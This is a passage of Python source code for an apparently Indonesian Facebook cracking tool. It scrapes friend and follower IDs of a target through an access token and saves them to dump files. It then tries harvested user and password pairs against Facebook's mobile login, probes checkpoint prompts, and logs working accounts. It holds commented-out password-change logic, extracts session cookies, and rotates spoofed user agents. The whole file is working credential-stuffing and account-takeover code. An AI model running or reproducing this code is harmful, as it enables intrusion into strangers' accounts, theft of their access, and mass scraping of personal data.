#							boke = zz["paging"]["previous"]
							print(boke)
							try:
								qqq = ("dump/"+fila+".json").replace(" ","_")
								dump = open(qqq , "a+")
								for ii in zz["data"]:
									uid = ii['id']
									nm = ii['name']
									lq.append(uid+'<=>'+nm)
									dump.write(uid+'<=>'+nm+'\n')
								dump.close()
							except KeyError:pass
							try:
								rr = requests.get(boke)
								zz = json.loads(rr.text)
#								try:boke = zz["paging"]["next"]
#								except:boke = zz["paging"]["previous"]
#								print(war+"JSON >>> "+boke)
								boke = zz["paging"]["next"]
#								boke = zz["paging"]["previous"]
								print(boke)
								try:
									qqq = ("dump/"+fila+".json").replace(" ","_")
									dump = open(qqq , "a+")
									for ii in zz["data"]:
										uid = ii['id']
										nm = ii['name']
										lq.append(uid+'<=>'+nm)
										dump.write(uid+'<=>'+nm+'\n')
									dump.close()
								except KeyError:pass
								try:
									rr = requests.get(boke)
									zz = json.loads(rr.text)
#									try:boke = zz["paging"]["next"]
#									except:boke = zz["paging"]["previous"]
#									print(war+"JSON >>> "+boke)
									boke = zz["paging"]["next"]
#									boke = zz["paging"]["previous"]
									print(boke)
									try:
										qqq = ("dump/"+fila+".json").replace(" ","_")
										dump = open(qqq , "a+")
										for ii in zz["data"]:
											uid = ii['id']
											nm = ii['name']
											lq.append(uid+'<=>'+nm)
											dump.write(uid+'<=>'+nm+'\n')
										dump.close()
									except KeyError:pass
									try:
										rr = requests.get(boke)
										zz = json.loads(rr.text)
#										try:boke = zz["paging"]["next"]
#										except:boke = zz["paging"]["previous"]
#										print(war+"JSON >>> "+boke)
										boke = zz["paging"]["next"]
#										boke = zz["paging"]["previous"]
										print(boke)
										try:
											qqq = ("dump/"+fila+".json").replace(" ","_")
											dump = open(qqq , "a+")
											for ii in zz["data"]:
												uid = ii['id']
												nm = ii['name']
												lq.append(uid+'<=>'+nm)
												dump.write(uid+'<=>'+nm+'\n')
											dump.close()
										except KeyError:pass
										try:
											rr = requests.get(boke)
											zz = json.loads(rr.text)
#											try:boke = zz["paging"]["next"]
#											except:boke = zz["paging"]["previous"]
#											print(war+"JSON >>> "+boke)
											boke = zz["paging"]["next"]
#											boke = zz["paging"]["previous"]
											print(boke)
											try:
												qqq = ("dump/"+fila+".json").replace(" ","_")
												dump = open(qqq , "a+")
												for ii in zz["data"]:
													uid = ii['id']
													nm = ii['name']
													lq.append(uid+'<=>'+nm)
													dump.write(uid+'<=>'+nm+'\n')
												dump.close()
											except KeyError:pass
										except KeyError:pass
									except KeyError:pass
								except KeyError:pass
							except KeyError:pass
						except KeyError:pass
					except KeyError:pass
				except KeyError:pass
			except KeyError:pass
		except KeyError:pass
	except KeyError:pass
	jalan(war+" Total Dump : "+I+str(len(lq)))
def dumppro():
	print(war+"This menu uses a Facebook token and the risk is that the token is easily damaged")
	time.sleep(3)
	idt = input(inp+"Target ID : "+I)
	if idt == " " or idt == "":
		dumppro()
	limit = "9999999999"
	filex = input(inp+"Filename Save Random : "+I)
	if filex == " " or filex == "":
		dumppro()
	fila = input(inp+"Filename Save Old : "+I)
	if fila == " " or fila == "":
		dumppro()
	elif fila == filex:
		jalan(war+"File Names Can't Be Same !!")
		dumppro()
	print(war+"Files Saved RANDOM In : "+I+"dump/"+filex+".json")
	print(war+"Files Saved OLD In    : "+I+"dump/"+fila+".json")
	try:
		toket = open("login.txt","r").read()
		token = open("login.txt","r").read()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		logs()
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	try:
		qqq = (".lpp").replace(" ","_")
		yss = open(qqq , "w")
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			id.append(uid+"<=>"+na)
			yss.write(uid+"<=>"+na+"\n")
		yss.close()
		tmen = ("%s"%(str(len(id))))
		print(war+'Total Facebook Accounts Public: '+I+str(len(id)))
		jalan(war+'START DUMP IDZ OLD')
		time.sleep(1)
		print("\n\n"+garis)
	except:pass
	try:
		pro1(".lpp",limit,filex,fila)
	except Exception as e:
		exit((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
	print(war+"Files Saved RANDOM In : "+I+"dump/"+filex+".json")
	print(war+"Files Saved OLD In    : "+I+"dump/"+fila+".json")
	jalan(war+"Press CTRL + C To Stop !")
def pro1(file,lim,savefile,fila):
    try:
        list_akun=open(file).read().splitlines()
        with ThreadPoolExecutor(max_workers=5) as su:
                try:
                        for akun in list_akun:
                                akun=akun.split("<=>")
                                try:
                                    su.submit(dump_public,akun[0],lim,savefile,fila)
                                except (KeyboardInterrupt,EOFError):
                                    exit(jalan(war+"Done :)"))
                except (KeyError, IOError):
                    exit(war+"Done...")
    except (KeyError, IOError):
        exit(war+"File Tidak Tersedia !!")
def dump_public(idt,limt,namefile,fila):
	try:
		toket = open("login.txt","r").read()
		token = open("login.txt","r").read()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		logs()
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	try:
		qqq = ("dump/"+namefile+".json").replace(" ","_")
		yss = open(qqq , "a+")
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			new_to_old(uid,na,fila)
			id.append(uid+"<=>"+na)
			yss.write(uid+"<=>"+na+"\n")
		yss.close()
	except KeyError:pass
	rr = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	zz = json.loads(rr.text)
	try:
		qqq = ("dump/"+namefile+".json").replace(" ","_")
		dump = open(qqq , "a+")
		for ii in zz["data"]:
			uid = ii['id']
			nm = ii['name']
			new_to_old(uid,nm,fila)
			lq.append(uid+'<=>'+nm)
			dump.write(uid+'<=>'+nm+'\n')
		dump.close()
	except KeyError:pass
	delete = ("""
	try:
		tmen = ("%s"%(str(len(id))))
		epaq = ("%s"%(str(len(lq))))
		print((("\r%sTotal ID Collected From %sPublic%s/%sFollow : %s%s%s/%s%s"%(war,C,M,U,I,tmen,M,U,epaq))), end=' ');sys.stdout.flush()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		pass""")
def new_to_old(olga,name,fileq):
	pmm=("<=>")
	try:
		if len(olga) < 10:
			print(war+olga+M+"   Very Old")
			ppx=open("dump/"+fileq+".json", "a+")
			ppx.write(olga+pmm+name+"\n")
			ppx.close()
	except:pass
	try:
		oldd = olga.split("00000")
		old = (f"100000{oldd[1]}")
		print(war+old+I+"   Already old ")
		ppx=open("dump/"+fileq+".json", "a+")
		ppx.write(old+pmm+name+"\n")
		ppx.close()
	except:pass

def ganti_pemisah():
	dirs = os.listdir("Hasil")
	for file in dirs:
		files = ("Hasil/"+file)
		print(bulat+"Available Files !!: "+i+files)
	files = input("\n"+war+"File Name : "+i)
	try:
		buka_baju = open(files,"r").readlines()
	except FileNotFoundError:
		print(war+"File Not Found")
		time.sleep(2)
		menu()
	pmhj = input(inp+"Current Separator :"+I)
	pmhg = input(inp+"Next Separator : "+I)
	print(war+"Files Saved In: "+I+"separator.txt")
	ppx=open("separator.txt", "w")
	list_akun=open(files).read().splitlines()
	try:
		with ThreadPoolExecutor(max_workers=10) as su:
			try:
				for akun in list_akun:
					akun=akun.split(pmhj)
					try:
						ttll = akun[2]
					except:ttll = ("-")
					su.submit(saveid,akun[0],akun[1],pmhg,ttll)
			except (KeyError, IOError):
				print(K+"Done !!")
				time.sleep(3)
				menu()
	except (KeyError, IOError):
		exit(war+"File Tidak Tersedia !!")
def saveid(idt,password,mhj,ttll):
	ppx=open("separator.txt", "a")
	ppx.write(idt+mhj+password+mhj+ttll+"\n")
	ppx.close()
def checkteman():
	jalan("\n\n"+war+"Type "+I+"*"+C+"me"+I+"*"+K+" if you want to check your own friends")
	idt = input(inp+"Id Target : "+I)
	try:
		toket = open("login.txt","r").read()
		token = open("login.txt","r").read()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		logs()
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	try:
		qqq = (".lpp").replace(" ","_")
		yss = open(qqq , "w")
		id = []
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			id.append(uid+"<=>"+na)
			yss.write(uid+"<=>"+na+"\n")
		yss.close()
		temn = ("%s"%(str(len(id))))
	except KeyError:
		temn = ("0")
		pass
	try:
		rr = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
		zz = json.loads(rr.text)
		qqqq = (".lpp").replace(" ","_")
		ysss = open(qqqq , "a+")
		idx = []
		for ii in zz["data"]:
			uidd = ii['id']
			nan = ii['name']
			iz.append(uidd+"<=>"+nan)
			ysss.write(uidd+"<=>"+nan+"\n")
		ysss.close()
		fllow = ("%s"%(str(len(iz))))
	except KeyError:
		fllow = ("0")
		pass
	baka = open(".lpp","r").readlines()
	bakA = ("%s"%(str(len(baka))))
	try:print(war+'Total Facebook Accounts Public: '+I+temn)
	except:print(war+'Total Facebook Accounts Public: '+I+"0")
	print(war+'Total Facebook Accounts Follow : '+I+fllow)
	print(war+'Total All Facebook Accounts    : '+C+str(len(baka))+"\n\n")
#	if temn == "0":
	if fllow == "0":
		if bakA == "0":
			jalan(war+"Sorry, No Friends and Follow List Data Found")
			input(war+"Please Press Enter !!")
			menuvvip()
	jalan(war+"Results Check Friends And Follow Saved At :"+I+" dump/check_save.txt"+q+"\n\n\n")
	time.sleep(2)
	pepekxa(qqq)
def pepekxa(file):
    try:
        list_akun=open(file).read().splitlines()
        with ThreadPoolExecutor(max_workers=25) as su:
                try:
                        for akun in list_akun:
                                akun=akun.split("<=>")
                                su.submit(kontolkau,akun[0],akun[1])
                except (KeyError, IOError):
                    exit(war+"Done...")
    except (KeyError, IOError):
        exit(war+"File Tidak Tersedia !!")
def kontolkau(idt,name):
	global jq
	try:
		toket = open("login.txt","r").read()
		token = open("login.txt","r").read()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		logs()
	try:
		r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, toket))
		z = json.loads(r.text)
		pengikut = z['summary']['total_count']
	except (KeyError, IOError):
		pengikut = '0'
	try:
		rr = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		zz = json.loads(rr.text)
		id = []
		for ii in zz["data"]:
			uid = ii['id']
			na = ii['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
		bh=("%s"%(str(len(id))))
	except:
		bh=("0")
		pass
	jq += 1
	try:
		print(k+"["+I+str(int(jq))+k+"]"+K+"ID : "+I+idt+K+" Follow : "+I+str(pengikut)+K+" Friend : "+I+bh), time.sleep(0.03)
		wrt = ('IDZ : %s | Friend : %s | Follow : %s'%(idt,bh,str(pengikut)))
		open('dump/check_save.txt' , 'a+').write('%s\n' % wrt)
	except KeyboardInterrupt:
		input(inp+'Back !!')
		menu()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		exit()
def cek_epep(idt,name):
	global jq
	try:
		toket = open("login.txt","r").read()
		token = open("login.txt","r").read()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		logs()
	try:
		r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, toket))
		z = json.loads(r.text)
		pengikut = z['summary']['total_count']
	except (KeyError, IOError):
		pengikut = '0'
	try:
		rr = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		zz = json.loads(rr.text)
		id = []
		for ii in zz["data"]:
			uid = ii['id']
			na = ii['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
		bh=("%s"%(str(len(id))))
		jq += 1
	except:
		pass
	try:
		print(k+"    ["+I+str(int(jq))+k+"]"+K+"ID : "+I+idt+K+" Follow : "+I+str(pengikut)+K+" Friend : "+I+bh)
	except: pass
def buatngecek():
	try:
		toket = open("login.txt","r").read()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		logs()
	cekfile("Hasil")
	files = input("\n"+war+"File Name : "+i)
	try:
		buka_baju = open(files,"r").readlines()
	except FileNotFoundError:
		print(war+"File Not Found")
		time.sleep(2)
		exit()
	print(bulat+"Total Akun : "+u+str(len(buka_baju)))
	print(bulat+c+"="*50)
	for memek in buka_baju:
		kontol = memek.replace("\n","")
#		titidd  = kontol.split("* --> ")
#		titid  = titidd[1].split("|")
		titid  = kontol.split("|")
		try:
			ttll = ("%s"%(titid[2]))
		except:
			ttll = (" - ")
		try:
			log_hasil(titid[0], titid[1], ttll)
		except requests.exceptions.ConnectionError:
			continue
		except Exception as e:
			continue
		print("\n")
	exit(f"{bulat} Selesai...")
def log_hasil(user, pasw, ttll):
    print(war+C+user+"|"+pasw+" | "+ttll)
    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    host = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("%s[%s!%s] %sAkun Terkena Spam"%(M,P,M,P))
    if "c_user" in ses.cookies:
        print("%s[%s•%s] %sAkun OK Tidak Checkpoint"%(I,P,I,I))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            jalan("%s[%s•%s] %sJust Wait for the Final Stage, To Change Password"%(I,P,I,I))
            open("Hasil/Akun_Tap_Yes.txt","a+").write("{}|{}\n".format(user,pasw))
            bokep_japan_yang_terbaru("TAP", user, pasw, "-")
#            try:
 #               ekse(user,pasw)
  #          except:
   #             print(war+U+'Failed to Change Password, Just Change Yourself >\\\\<')
#                 open("Hasil/no_change.txt","a+").write("{}|{}\n".format(user,pasw))
        else:
            print("%s[%s•%s] %s %s Options Available"%(C,P,C,P,str(len(ngew))))
        for opt in range(len(ngew)):
            print(" "*3, str(opt+1)+". "+ngew[opt])
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        print("%s[%s!%s] %s%s"%(M,P,M,P,oh))
    else:
        print("%s[%s!%s] %sPassword Was Changed"%(M,P,M,P))
def ambil_cok(id, pw):
	for i in pw:
		log = log_mbasic((id),
			pw,"https://mbasic.facebook.com")
		if log.get("status")=="cp":
			print(war+"Akun CP")
		elif log.get("status")=="success":
			h_ok=(" ")
			cek_apk(h_ok,koki(log.get("cookies")))
			print(""+log.get("cookies"))
#	elif log.get("status")=="error":
#		ambil_cok(id, pw)
def ekse(username,password):
        useragent="Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
        try:
                respons=login_ris(username,password)
        except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                ekse(username,password)
        session=respons[0]
        if "c_user" in session.cookies.get_dict():
                print(war+C+'This Account Not Detected')
                open("Hasil/ok.txt","a+").write("{}|{}\n".format(username,password))
        elif "checkpoint" in session.cookies.get_dict():
                session.headers.update({"Host":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1).split("//")[1],"referer":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1)+"/checkpoint/"})
                respon=tahap1(session,parser(respons[1].text))
                if respon == "new password":
                        jalan(war+U+"Successfully Change Password !!")
                        print(war+C+"{}|{}".format(username,newpass))
                        open("Hasil/newpass.txt","a+").write("{}|{}\n".format(username,newpass))
#                        ambil_cok(username, newpass)
                elif respon == "no change password":
                        print(war+"Password Change Failed")
                        open("Hasil/no_change.txt","a+").write("{}|{}\n".format(username,password))
                else:pass
        else:
                pass

def cek_log(user, pasw, h_cp):
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": mb,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": mb+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("[!] Redirect Overload")
    if "c_user" in ses.cookies:
        return {"status":"error","email":user,"pass":pasw}
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        option_dev = []
        j_opsi = []
        for opt in range(len(ngew)):
            option_dev.append("\r\n     "+P+str(opt+1)+". "+ngew[opt]+"                        ")
            j_opsi = ("%s"%(str(opt+1)))
        if j_opsi <= "0" or j_opsi <= "00":
            print(h_cp+"".join(option_dev))
            print("     TAP YES                      ")
        else:
            print(h_cp+"".join(option_dev))
    elif "login_error" in str(run):
        pass
    else:
        pass
def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    sample = "".join(result)
    sam_   = sample.replace(' ','')
    samp_  = sam_.split(';')
    final = ('%s; %s; %s; %s; %s'%(samp_[4],samp_[1],samp_[0],samp_[5],samp_[3]))
    return final
def cek_apk(h_ok,_dapunta_):
    apk = []
    ses_ = requests.Session()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    print(h_ok+''.join(apk))
def check_opq(user, pasw, ttll):
	mb = ("https://mbasic.facebook.com")
	ua15 ="Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.701 Mobile Safari/534.8+"
	ua14 ="Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
	ua13 ="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 OPR/63.3.3216.58675"
	ua1 ="Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977"
	ua10="Mozilla / 5.0 (Linux; Android 5.0; SM-G900P Build / LRX21T; wv) AppleWebKit / 537.36 (KHTML, like Gecko) Version / 4.0 Chrome / 43.0.2357.121 Mobile Safari / 537.36 [ FB _ IAB / FB4A; FBAV / 35.0.0.48.273 ;]"
	ua11="Mozilla / 5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build / 5887208) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 93.0.4577.62 Mobile Safari / 537.36 [FBAN / EMA; FBLC / ID; FBAV / 239.0.0.10.109 ;]"
	ua9="Mozilla / 5.0 (Windows NT 10.0; WOW64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 93.0.4577.63 Safari / 537.36 [FBAN / EMA; FBLC / id _ ID; FBAV / 239.0.0.10.109 ;]"
	ua8 ="Mozilla / 5.0 (Linux; Android 5.1.1; A37f) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 89.0.4389.105 Mobile Safari / 537.36 [FBAN / EMA; FBLC / ID; FBAV / 239.0.0.10.109 ;]"
	ua7 ="Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
	ua5="Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
	ua12="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
	ua4="Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
	ua3 ="Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
	ua2 ="Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/2.0; Touch; rv: 10.0; IEMobile/11.0; NOKIA; Lumia 635) AppleWebKit/537 KHTML, like Gecko) Mobile Safari/537"
	ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
	ses = requests.Session()
	# kntl bapackkau pecah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(K+"["+I+"++"+K+"]"+I+" Successful/OK To Login : %s%s"%(q,str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(K+"["+I+"++"+K+"]"+C+" Total Available Checkpoint Options:  "+q+str(len(ngew)))
		for opt in range(len(ngew)):
			print("[\033[1;33m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
		if len(ngew) == 0:
			print("\n"+K+"["+I+"++"+K+"]"+I+" One Tap Yes / SuccessFul To Login"+q)
			ppx=open("Hasil/Tap_Yes.txt", "a+")
			ppx.write(user+" | "+pasw+"\n")
			ppx.close()
		elif len(ngew) <= 5:
#			wrt = ('%s|%s|%s'%(user,pasw,ttll))
#			open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
#		except Exception as e:
			print("\n"+K+"["+I+"++"+K+"]"+K+"CheckPoint! Try Again Later  "+q)
		else:
			print (' ')
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(K+"["+I+"++"+K+"]"+M+" %s%s"%(oh,q))
	else:
		print(K+"["+I+"++"+K+"]"+M+" Login Failed! User Id/Password Is Incorrect"+q+"\n")
def dekura_chann(uid, pw):
	ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
	ses = requests.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": mb,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
